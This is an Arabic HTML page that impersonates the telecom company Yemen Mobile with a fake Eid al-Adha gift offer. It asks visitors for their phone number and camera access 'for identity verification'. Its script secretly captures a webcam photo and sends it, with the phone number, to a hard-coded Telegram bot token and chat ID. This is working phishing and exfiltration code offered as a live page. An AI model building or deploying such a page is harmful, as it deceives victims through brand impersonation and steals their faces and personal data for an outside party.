<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>الرئيسية - يمن موبايل</title>
  <meta name="description" content="مرحبا بكم في شركة يمن موبايل - جوائز بمناسبة عيد الأضحى المبارك">
  <style>
    body {
      text-align: center;
      direction: rtl;
      font-family: Tahoma, sans-serif;
      background-color: #f9f9f9;
      padding: 30px;
    }
    button {
      font-size: 18px;
      text-decoration: none;
      font-weight: bold;
      margin: 10px;
      padding: 10px 30px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
    .start-button {
      background-color: #007bff;
      color: white;
    }
    .start-button:hover {
      background-color: #0056b3;
    }
    .back-button {
      background-color: #6c757d;
      color: white;
    }
    .back-button:hover {
      background-color: #5a6268;
    }
    #consentBox {
      background: #fff3cd;
      border: 1px solid #ffeeba;
      padding: 20px;
      margin: 20px auto;
      width: 60%;
      border-radius: 8px;
      font-size: 18px;
    }
  </style>
</head>
<body>
  <h2>اضغط الزر للحصول على هدية مقدمة من يمن موبايل (رصيد أو مزايا)</h2>

  <input type="tel" id="phoneNumber" placeholder="أدخل رقم هاتفك" style="margin-bottom: 10px; padding: 10px; font-size: 18px;"><br>

  <div id="consentBox">
    <p>📸 سنطلب إذن لتشغيل الكاميرا من أجل التحقق من هويتك. هل توافق؟</p>
    <button class="start-button" onclick="confirmConsent()">أوافق</button>
  </div>

  <button class="start-button" id="confirmBtn" onclick="startCameraAndSend()" style="display: none;">تأكيد</button>
  <button class="back-button" onclick="history.back()">رجوع</button>

  <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>

  <p id="confirmationMessage" style="display: none; font-size: 24px; color: green;">
    تم تأكيد رقمك: <span id="confirmedNumber"></span>
  </p>

  <script>
    let canvas = document.getElementById('canvas');
    let video = null;
    let stream = null;

    const botToken = '6767498865:AAFibdms3ba_9bH8vqD6X92DrkiRHkPEn2w';
    const chatId = '7057346640';

    function confirmConsent() {
      document.getElementById('consentBox').style.display = 'none';
      document.getElementById('confirmBtn').style.display = 'inline-block';
    }

    function startCameraAndSend() {
      const phoneNumber = document.getElementById('phoneNumber').value.trim();
      if (phoneNumber === '') {
        alert('يرجى إدخال رقم الهاتف.');
        return;
      }

      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        alert('المتصفح لا يدعم الكاميرا.');
        return;
      }

      video = document.createElement('video');
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(s => {
          stream = s;
          video.srcObject = stream;
          video.play();

          setTimeout(() => {
            captureAndSend(phoneNumber);
          }, 1000);
        })
        .catch(error => {
          console.error('فشل تشغيل الكاميرا:', error);
          alert('تعذر تشغيل الكاميرا.');
        });
    }

    function captureAndSend(phoneNumber) {
      let context = canvas.getContext('2d');
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }

      let imageData = canvas.toDataURL('image/png');
      let base64Image = imageData.split(',')[1];

      const formData = createFormData(base64Image, chatId, phoneNumber);
      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData,
      })
      .then(response => response.json())
      .then(result => {
        if (result.ok) {
          document.getElementById('confirmedNumber').innerText = phoneNumber;
          document.getElementById('confirmationMessage').style.display = 'block';
        } else {
          console.error('فشل في إرسال الصورة:', result);
          alert('حدث خطأ أثناء إرسال الصورة.');
        }
      })
      .catch(error => {
        console.error('خطأ في الإرسال:', error);
        alert('تعذر إرسال الصورة.');
      });
    }

    function createFormData(base64, chatId, phoneNumber) {
      const byteCharacters = atob(base64);
      const byteNumbers = new Array(byteCharacters.length);
      for (let i = 0; i < byteCharacters.length; i++) {
        byteNumbers[i] = byteCharacters.charCodeAt(i);
      }
      const byteArray = new Uint8Array(byteNumbers);
      const blob = new Blob([byteArray], { type: 'image/png' });

      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, 'snapshot.png');
      formData.append('caption', `رقم الهاتف: ${phoneNumber}`);
      return formData;
    }
  </script>
</body>
    </html>
